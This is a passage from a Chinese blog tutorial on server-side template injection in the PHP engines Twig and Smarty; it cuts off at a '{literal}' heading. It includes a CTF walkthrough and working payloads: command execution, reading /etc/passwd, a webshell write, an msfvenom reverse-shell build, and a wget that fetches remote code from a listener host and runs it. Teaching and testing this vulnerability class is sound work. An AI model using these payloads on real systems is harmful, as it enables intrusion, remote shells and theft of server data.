		<div id="post_detail">
    <!--done-->
    <div id="topics">
        <div class="post">
            <h1 class="postTitle">
                
<a id="cb_post_title_url" class="postTitle2 vertical-middle post-del-title" href="https://www.cnblogs.com/bmjoker/p/13508538.html">
    <span role="heading" aria-level="2">1. SSTI（模板注入）漏洞（入门篇）</span>
    

</a><button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815135535822-1303181439.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815135535822-1303181439.png" alt="" width="620" height="349" loading="lazy" class="medium-zoom-image"></a></p>
<p>好久没更新博客了，现在主要在作源码审计相关工作，在工作中也遇到了各种语言导致的一些SSTI，今天就来大概说一下SSTI模板注入这个老生常谈的漏洞</p>
<h1>前言<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h1>
<h2>模板引擎<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
<h2>SSTI（模板注入）<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
<p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
<h2>附表<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911174631687-758048107.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911174631687-758048107.png" alt="" width="515" height="587" loading="lazy" class="medium-zoom-image"></a></p>
<h1>Php中的SSTI<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h1>
<p>php常见的模板：twig，smarty，blade</p>
<h2>Twig<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815153729779-1563757467.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815153729779-1563757467.png" alt="" width="289" height="141" loading="lazy" class="medium-zoom-image"></a></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-syf7TQ"><code-line class="line-numbers-rows"></code-line>&lt;?php
<code-line class="line-numbers-rows"></code-line>　　require_once dirname(__FILE__).'\twig\lib\Twig\Autoloader.php';
<code-line class="line-numbers-rows"></code-line>　　Twig_Autoloader::register(true);
<code-line class="line-numbers-rows"></code-line>　　$twig = new Twig_Environment(new Twig_Loader_String());
<code-line class="line-numbers-rows"></code-line>　　$output = $twig-&gt;render("Hello {{name}}", array("name" =&gt; $_GET["name"]));  // 将用户输入作为模版变量的值
<code-line class="line-numbers-rows"></code-line>　　echo $output;
<code-line class="line-numbers-rows"></code-line>?&gt;</code-pre></pre>
</div>
<p>Twig使用一个加载器<span style="background-color: rgba(255, 255, 153, 1)"> loader(Twig_Loader_Array)</span> 来定位模板，以及一个环境变量<span style="background-color: rgba(255, 255, 153, 1)"> environment(Twig_Environment)</span> 来存储配置信息。</p>
<p>其中，<span style="background-color: rgba(255, 255, 153, 1)">render()</span> 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>
<p>使用 Twig 模版引擎渲染页面，其中模版含有&nbsp;<span style="background-color: rgba(255, 255, 153, 1)">{{name}}</span>&nbsp; 变量，其模版变量值来自于GET请求参数<span style="background-color: rgba(255, 255, 153, 1)">$_GET["name"]&nbsp;</span>。</p>
<p>显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815170919414-672456065.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815170919414-672456065.png" alt="" width="705" height="300" loading="lazy" class="medium-zoom-image"></a></p>
<p>但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-jFh7WZ"><code-line class="line-numbers-rows"></code-line>&lt;?php
<code-line class="line-numbers-rows"></code-line>　　require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
<code-line class="line-numbers-rows"></code-line>　　Twig_Autoloader::register(true);
<code-line class="line-numbers-rows"></code-line>　　$twig=newTwig_Environment(newTwig_Loader_String());
<code-line class="line-numbers-rows"></code-line>　　$output=$twig-&gt;render("Hello {$_GET['name']}");// 将用户输入作为模版内容的一部分
<code-line class="line-numbers-rows"></code-line>　　echo $output;?&gt;</code-pre></pre>
</div>
<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815171105220-873778530.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815171105220-873778530.png" alt="" width="665" height="437" loading="lazy" class="medium-zoom-image"></a></p>
<p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p>
<p>在Twig模板引擎里,，<span style="background-color: rgba(255, 255, 153, 1)">{{var}}</span> 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p>
<p>例如这里用户输入<span style="background-color: rgba(255, 255, 153, 1)">name={{2*10}}</span>&nbsp;，则在服务端拼接的模版内容为:</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815171519739-387170199.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200815171519739-387170199.png" alt="" width="512" height="225" loading="lazy" class="medium-zoom-image"></a></p>
<p>尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-rDQiB8"><code-line class="line-numbers-rows"></code-line>bmjoker{# comment #}{{2*8}}OK</code-pre></pre>
</div>
<p>实际服务端要进行编译的模板就被构造为:</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-mWJXT2"><code-line class="line-numbers-rows"></code-line>bmjoker{# comment #}{{2*8}}OK</code-pre></pre>
</div>
<p>由于<span style="background-color: rgba(255, 255, 153, 1)">&nbsp;{# comment #}&nbsp;</span> 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而<span style="background-color: rgba(255, 255, 153, 1)">&nbsp;{{2*8}}&nbsp;</span>作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容&nbsp;<span style="background-color: rgba(255, 255, 153, 1)">Hello bmjoker16OK&nbsp;</span></p>
<p><span style="background-color: rgba(255, 255, 153, 1)"><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818195732706-567305144.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818195732706-567305144.png" alt="" width="590" height="104" loading="lazy" class="medium-zoom-image"></a></span></p>
<p>通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818195801226-981945295.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818195801226-981945295.png" alt="" width="623" height="274" loading="lazy" class="medium-zoom-image"></a></p>
<p><span style="font-size: 14px">同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</span></p>
<p><span style="font-size: 14px">每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</span></p>
<p><span style="font-size: 14px">简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</span></p>
<p><span style="font-size: 14px">凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。</span></p>
<p><span style="font-size: 14px">接下来借助XVWA的代码来实践演示一下SSTI注入</span></p>
<p><span style="font-size: 14px">如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-4idJzX"><code-line class="line-numbers-rows"></code-line>&lt;div&gt;{$what}&lt;/div&gt;
<code-line class="line-numbers-rows"></code-line>&lt;p&gt;Welcome, {{username}}&lt;/p&gt;
<code-line class="line-numbers-rows"></code-line>&lt;div&gt;{%$a%}&lt;/div&gt;
<code-line class="line-numbers-rows"></code-line>...</code-pre></pre>
</div>
<p>通过注入了探测字符串 <span style="background-color: rgba(255, 255, 153, 1)">${{123+456}}</span>，以查看应用程序是否进行了相应的计算：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818231335548-122594708.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818231335548-122594708.png" alt="" width="569" height="309" loading="lazy" class="medium-zoom-image"></a></p>
<p>根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于<span style="background-color: rgba(255, 255, 153, 1)"> {{ }}</span> 的处理方式</p>
<p>在这里提供一个针对twig的攻击载荷：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-3d2A7c"><code-line class="line-numbers-rows"></code-line>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818231853350-914354726.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818231853350-914354726.png" alt="" width="623" height="262" loading="lazy" class="medium-zoom-image"></a></p>
<p>使用msf生成了一个php meterpreter有效载荷</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-xaHrtT"><code-line class="line-numbers-rows"></code-line>msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 &gt; /var/www/html/shell.txt</code-pre></pre>
</div>
<p>msf进行监听：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818232520602-1757346385.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818232520602-1757346385.png" alt="" width="528" height="177" loading="lazy" class="medium-zoom-image"></a></p>
<p>模板注入远程下载shell，并重命名运行</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-THPX72"><code-line class="line-numbers-rows"></code-line>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php")}}</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818232914668-1182705687.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200818232914668-1182705687.png" alt="" width="535" height="230" loading="lazy" class="medium-zoom-image"></a></p>
<p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了<span style="background-color: rgba(255, 255, 153, 1)"> filter</span> 和<span style="background-color: rgba(255, 255, 153, 1)"> map</span> 等内容，补充一些新版本的payload：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-k8TJQR"><code-line class="line-numbers-rows"></code-line>{{'/etc/passwd'|file_excerpt(1,30)}}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{app.request.files.get(1).__construct('/etc/passwd','')}}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{app.request.files.get(1).openFile.fread(99)}}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{["id"]|map("system")|join(",")
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{{"&lt;?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{["id",0]|sort("system")|join(",")}}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{["id"]|filter("system")|join(",")}}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{[0,0]|reduce("system","id")|join(",")}}
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>{{['cat /etc/passwd']|filter('system')}}</code-pre></pre>
</div>
<p>具体payload分析详见：《<a href="https://xz.aliyun.com/t/7518#toc-5" target="_blank" rel="noopener">TWIG 全版本通用 SSTI payloads</a>》</p>
<p>　　　　　　　　　　&nbsp; 《<a href="https://my.oschina.net/u/4588149/blog/4408349" rel="noopener">SSTI-服务器端模板注入</a>》</p>
<h2>Smarty<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p><span style="font-size: 14px">Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</span></p>
<p><span style="font-size: 14px">但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a href="https://github.com/smarty-php/smarty" rel="noopener" target="_blank">模板的文档</a>以后我们发现：<span style="background-color: rgba(255, 255, 153, 1)">$smarty内置变量可用于访问各种环境变量</span>，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</span></p>
<p><span style="color: rgba(51, 102, 255, 1)">smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable()&nbsp;</span><span style="color: rgba(51, 102, 255, 1); font-family: PingFangSC-Regular, Helvetica, &quot;Helvetica Neue&quot;, &quot;Segoe UI&quot;, &quot;Hiragino Sans GB&quot;, &quot;Source Han Sans CN&quot;, &quot;Microsoft YaHei&quot;, STHeiti, &quot;WenQuanYi Micro Hei&quot;, sans-serif; font-size: 15px; text-align: justify">这个方法可以获取传入变量的流</span></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200910234359019-777787778.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200910234359019-777787778.png" alt="" width="506" height="326" loading="lazy" class="medium-zoom-image"></a></p>
<p><span style="color: rgba(51, 51, 51, 1); font-family: &quot;Varela Round&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Menlo, Monaco, monospace, &quot;Lucida Console&quot;, sans-serif, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, &quot;Source Han Sans CN Regular&quot;, &quot;WenQuanYi Micro Hei&quot;, Arial, sans-serif; font-size: 14px">因此我们可以用这个方法读文件，payload:</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-3XPbie"><code-line class="line-numbers-rows"></code-line>{self::getStreamVariable("file:///etc/passwd")}</code-pre></pre>
</div>
<p>同样</p>
<p><span style="color: rgba(51, 102, 255, 1)">smarty/libs/sysplugins/smarty_internal_write_file.php　　——&gt;　　</span><span style="color: rgba(51, 102, 255, 1)">Smarty_Internal_Write_File&nbsp;</span><span style="color: rgba(51, 102, 255, 1); font-family: PingFangSC-Regular, Helvetica, &quot;Helvetica Neue&quot;, &quot;Segoe UI&quot;, &quot;Hiragino Sans GB&quot;, &quot;Source Han Sans CN&quot;, &quot;Microsoft YaHei&quot;, STHeiti, &quot;WenQuanYi Micro Hei&quot;, sans-serif; font-size: 15px; text-align: justify">这个类中有一个writeFile方法</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-JB3spG"><code-line class="line-numbers-rows"></code-line>class Smarty_Internal_Write_File
<code-line class="line-numbers-rows"></code-line>{
<code-line class="line-numbers-rows"></code-line>    /**
<code-line class="line-numbers-rows"></code-line>     * Writes file in a safe way to disk
<code-line class="line-numbers-rows"></code-line>     *
<code-line class="line-numbers-rows"></code-line>     * @param  string $_filepath complete filepath
<code-line class="line-numbers-rows"></code-line>     * @param  string $_contents file content
<code-line class="line-numbers-rows"></code-line>     * @param  Smarty $smarty    smarty instance
<code-line class="line-numbers-rows"></code-line>     *
<code-line class="line-numbers-rows"></code-line>     * @throws SmartyException
<code-line class="line-numbers-rows"></code-line>     * @return boolean true
<code-line class="line-numbers-rows"></code-line>     */
<code-line class="line-numbers-rows"></code-line>    public function writeFile($_filepath, $_contents, Smarty $smarty)
<code-line class="line-numbers-rows"></code-line>    {
<code-line class="line-numbers-rows"></code-line>        $_error_reporting = error_reporting();
<code-line class="line-numbers-rows"></code-line>        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);
<code-line class="line-numbers-rows"></code-line>        if ($smarty-&gt;_file_perms !== null) {
<code-line class="line-numbers-rows"></code-line>            $old_umask = umask(0);
<code-line class="line-numbers-rows"></code-line>        }
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>        $_dirpath = dirname($_filepath);
<code-line class="line-numbers-rows"></code-line>        // if subdirs, create dir structure
<code-line class="line-numbers-rows"></code-line>        if ($_dirpath !== '.' &amp;&amp; !file_exists($_dirpath)) {
<code-line class="line-numbers-rows"></code-line>            mkdir($_dirpath, $smarty-&gt;_dir_perms === null ? 0777 : $smarty-&gt;_dir_perms, true);
<code-line class="line-numbers-rows"></code-line>        }
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>        // write to tmp file, then move to overt file lock race condition
<code-line class="line-numbers-rows"></code-line>        $_tmp_file = $_dirpath . DS . str_replace(array('.', ','), '_', uniqid('wrt', true));
<code-line class="line-numbers-rows"></code-line>        if (!file_put_contents($_tmp_file, $_contents)) {
<code-line class="line-numbers-rows"></code-line>            error_reporting($_error_reporting);
<code-line class="line-numbers-rows"></code-line>            throw new SmartyException("unable to write file {$_tmp_file}");
<code-line class="line-numbers-rows"></code-line>       }
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>        /*
<code-line class="line-numbers-rows"></code-line>         * Windows' rename() fails if the destination exists,
<code-line class="line-numbers-rows"></code-line>         * Linux' rename() properly handles the overwrite.
<code-line class="line-numbers-rows"></code-line>         * Simply unlink()ing a file might cause other processes
<code-line class="line-numbers-rows"></code-line>         * currently reading that file to fail, but linux' rename()
<code-line class="line-numbers-rows"></code-line>         * seems to be smart enough to handle that for us.
<code-line class="line-numbers-rows"></code-line>         */
<code-line class="line-numbers-rows"></code-line>        if (Smarty::$_IS_WINDOWS) {
<code-line class="line-numbers-rows"></code-line>            // remove original file
<code-line class="line-numbers-rows"></code-line>            if (is_file($_filepath)) {
<code-line class="line-numbers-rows"></code-line>                @unlink($_filepath);
<code-line class="line-numbers-rows"></code-line>            }
<code-line class="line-numbers-rows"></code-line>            // rename tmp file
<code-line class="line-numbers-rows"></code-line>            $success = @rename($_tmp_file, $_filepath);
<code-line class="line-numbers-rows"></code-line>        } else {
<code-line class="line-numbers-rows"></code-line>            // rename tmp file
<code-line class="line-numbers-rows"></code-line>            $success = @rename($_tmp_file, $_filepath);
<code-line class="line-numbers-rows"></code-line>            if (!$success) {
<code-line class="line-numbers-rows"></code-line>                // remove original file
<code-line class="line-numbers-rows"></code-line>                if (is_file($_filepath)) {
<code-line class="line-numbers-rows"></code-line>                    @unlink($_filepath);
<code-line class="line-numbers-rows"></code-line>                }
<code-line class="line-numbers-rows"></code-line>                // rename tmp file
<code-line class="line-numbers-rows"></code-line>                $success = @rename($_tmp_file, $_filepath);
<code-line class="line-numbers-rows"></code-line>            }
<code-line class="line-numbers-rows"></code-line>        }
<code-line class="line-numbers-rows"></code-line>        if (!$success) {
<code-line class="line-numbers-rows"></code-line>            error_reporting($_error_reporting);
<code-line class="line-numbers-rows"></code-line>            throw new SmartyException("unable to write file {$_filepath}");
<code-line class="line-numbers-rows"></code-line>        }
<code-line class="line-numbers-rows"></code-line>        if ($smarty-&gt;_file_perms !== null) {
<code-line class="line-numbers-rows"></code-line>            // set file permissions
<code-line class="line-numbers-rows"></code-line>            chmod($_filepath, $smarty-&gt;_file_perms);
<code-line class="line-numbers-rows"></code-line>            umask($old_umask);
<code-line class="line-numbers-rows"></code-line>        }
<code-line class="line-numbers-rows"></code-line>        error_reporting($_error_reporting);
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>        return true;
<code-line class="line-numbers-rows"></code-line>    }
<code-line class="line-numbers-rows"></code-line>}</code-pre></pre>
</div>
<p>可以看到 <span style="background-color: rgba(255, 255, 153, 1)">writeFile</span> 函数第三个参数一个 <span style="background-color: rgba(255, 255, 153, 1)">Smarty</span> 类型，后来找到了 <span style="background-color: rgba(255, 255, 153, 1)">self::clearConfig()</span>，函数原型：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-K5BRZr"><code-line class="line-numbers-rows"></code-line>public function clearConfig($varname = null)
<code-line class="line-numbers-rows"></code-line>{
<code-line class="line-numbers-rows"></code-line>    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
<code-line class="line-numbers-rows"></code-line>}</code-pre></pre>
</div>
<p><span style="color: rgba(51, 51, 51, 1); font-family: &quot;Varela Round&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Menlo, Monaco, monospace, &quot;Lucida Console&quot;, sans-serif, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, &quot;Source Han Sans CN Regular&quot;, &quot;WenQuanYi Micro Hei&quot;, Arial, sans-serif; font-size: 14px">因此我们可以构造payload写个webshell:</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-CzX5bF"><code-line class="line-numbers-rows"></code-line>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php eval($_GET['cmd']); ?&gt;",self::clearConfig())}</code-pre></pre>
</div>
<h3>CTF实例讲解<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<p>CTF地址：https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</p>
<p>题目模拟了一个获取IP的API，并且可以在最下方看到 "Build With Smarty !" 可以确定页面使用的是Smarty模板引擎。</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820231808793-180982707.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820231808793-180982707.png" alt="" width="586" height="271" loading="lazy" class="medium-zoom-image"></a></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820232249193-1694257286.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820232249193-1694257286.png" alt="" width="592" height="74" loading="lazy" class="medium-zoom-image"></a></p>
<p>在页面的右上角发现了IP，但是题目中显示的API的URL由于环境的原因无法使用，猜测这个IP受X-Forwarded-For头控制。</p>
<p>将XFF头改为<span style="background-color: rgba(255, 255, 153, 1)"> {6*7}</span> 会发现该位置的值变为了<span style="background-color: rgba(255, 255, 153, 1)">42</span>，便可以确定这里存在SSTI。</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820232629595-1646272720.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820232629595-1646272720.png" alt="" width="698" height="266" loading="lazy" class="medium-zoom-image"></a></p>
<p>直接构造<span style="background-color: rgba(255, 255, 153, 1)"> {system('cat /flag')}</span> 即可得到flag</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820232839480-729397105.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820232839480-729397105.png" alt="" width="697" height="286" loading="lazy" class="medium-zoom-image"></a></p>
<h3>Smarty-SSTI常规利用方式：<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<p><strong>1.&nbsp;{$smarty.version}</strong></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-bcheBc"><code-line class="line-numbers-rows"></code-line>{$smarty.version}  #获取smarty的版本号</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820233050238-1942906786.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820233050238-1942906786.png" alt="" width="695" height="262" loading="lazy" class="medium-zoom-image"></a></p>
<p><strong>2. {php}{/php}</strong></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-mKWXyC"><code-line class="line-numbers-rows"></code-line>{php}phpinfo();{/php}  #执行相应的php代码</code-pre></pre>
</div>
<p>Smarty支持使用<span style="background-color: rgba(255, 255, 153, 1)"> {php}{/php}</span> 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820233259128-196602210.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200820233259128-196602210.png" alt="" width="700" height="196" loading="lazy" class="medium-zoom-image"></a></p>
<p>因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
<p><strong>3. {literal}</strong></p>
<div class="cnblogs_code">
